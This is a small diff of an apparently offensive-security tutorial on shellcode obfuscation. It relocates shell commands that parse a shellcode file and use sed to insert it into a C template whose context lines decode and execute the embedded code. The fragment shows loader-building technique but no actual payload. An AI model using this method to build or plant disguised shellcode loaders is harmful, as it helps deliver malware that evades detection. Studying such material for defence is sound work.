@@ -64,10 +64,6 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
       # store parsed data into '$store' local var
       store=`cat shellcode.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`
 
-      # inject shellcode into template.c using SED bash command
-      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c
-
-
 - **template.c**
 
       #include
@@ -120,6 +116,14 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
          mycode = decode_mycode(buffer,mycode,size);
          exec_mycode(mycode);
       }
+
+
+<br />
+
+
+      # inject shellcode into template.c using SED bash command
+      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c
+
 
 - compiling with **GCC**
 
